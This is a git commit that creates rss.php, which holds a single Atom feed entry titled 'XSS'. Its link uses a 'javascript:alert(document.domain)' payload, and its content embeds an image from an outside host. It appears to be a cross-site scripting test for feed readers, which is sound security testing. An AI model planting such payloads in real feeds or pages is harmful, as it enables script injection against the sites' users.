607f91e810dee0a5c00069a4e4d69503353ad1c9
Bhfiy <109387812+Bhfiy@users.noreply.github.com>
2023-12-09 16:01:11 +0530

    Create rss.php

---
+++ rss.php
@@ -0,0 +1,5 @@
+<entry>
+  <title>XSS</title>
+  <link rel="alternate" type="text/html" href="javascript:alert(document.domain)" />
+  <content type="html"><![CDATA[<img src="https://csrf.jp/test.png">]]></content>
+</entry>
